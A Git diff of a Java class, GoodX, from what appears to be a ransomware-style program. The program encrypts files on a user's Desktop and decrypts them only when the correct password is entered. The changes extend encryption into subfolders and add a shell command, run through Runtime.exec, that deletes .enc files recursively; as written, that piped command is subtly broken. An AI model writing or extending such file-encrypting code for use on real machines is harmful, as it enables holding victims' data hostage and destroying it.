@@ -12,6 +12,7 @@ import java.io.File;
 import java.io.IOException;
 import java.net.URISyntaxException;
 import java.util.Objects;
+import java.util.concurrent.atomic.AtomicInteger;
 
 import static com.security.FileEncryption.getDirPath;
 import static com.security.FileEncryption.getPassword;
@@ -32,6 +33,7 @@ public class GoodX {
     private static boolean fileAlreadyEncrypted = false;
 
     private GoodX() {
+        AtomicInteger click = new AtomicInteger();  // counter for how many times submit clicked with correct password
         submitButton.addActionListener(event -> {
             char[] passwordInput = passwordField.getPassword();
             if (isPasswordCorrent(passwordInput)) {
@@ -41,16 +43,17 @@ public class GoodX {
                     e.printStackTrace();
                 }
 
-
-                // for deleting .enc files after decrypting it.
-                File file = new File(getDirPath());
-                for (File f : Objects.requireNonNull(file.listFiles())) {
-                    if (f.getName().endsWith(".enc")) {
-                        f.delete();
-                    }
+                if (click.get() == 0) {
+                    JOptionPane.showMessageDialog(null, "\t\t\t\tCorrect Password!!!\n\t\t\t\t---------------\n\t\t\t\t|    " + new String(passwordInput) + "    |\n\t\t\t\t---------------" +
+                            "\nClick [Submit the key] button one more time to delete .enc files and keeping only main files");
+                } else {
+                    JOptionPane.showMessageDialog(null, "Correct Password!!!\n---------------\n|    " + new String(passwordInput) + "    |\n---------------" +
+                            "\n ---> DONE <----");
                 }
 
-                JOptionPane.showMessageDialog(null, "Correct Password!!!\n---------------\n|    " + new String(passwordInput) + "    |\n---------------");
+                removeEncFilesFromCurrentDir();
+
+                click.getAndIncrement();
             } else {
                 JOptionPane.showMessageDialog(null, "nope.");
             }
@@ -93,9 +96,6 @@ public class GoodX {
         return new String(passwordInput).equals(getPassword());
     }
 
-   /*
-   TODO: use this function for sanity check the code if the path leads to dir or file? or even empty dir or wrong path.
-    */
     /**
      * check the file path is directory or file and return it as a File[]
      * -- it will exeute the encryption or decryption mecanism on files.
@@ -110,11 +110,28 @@ public class GoodX {
                 if (child.isFile()) {
                     Log.getLog("File ", child.getName(), 1);
                     new FileEncryption(child.toString(), getPassword(), (byte) chiperMode).start();
+                } else {    // dig deeper if there's a folder in desktop directory
+                    for (File c : Objects.requireNonNull(child.listFiles())) {
+                        new FileEncryption(c.toString(), getPassword(), (byte) chiperMode).start();
+                    }
                 }
             }
         } else {
             noPath = true;
             JOptionPane.showMessageDialog(null, "no such dir \n ~/Users/doct0rX/Desktop");
+        }
+    }
+
+    /**
+     * removing the .enc files from current dir (.) but using recursion
+     * -- as the basic rm (remove) won't work for big lists of files
+     * it's based on running bash command
+     */
+    private static void removeEncFilesFromCurrentDir() {
+        try {
+            Runtime.getRuntime().exec("find . -name \"*.enc\" -print0 | xargs -0 rm");
+        } catch (IOException e) {
+            e.printStackTrace();
         }
     }
 
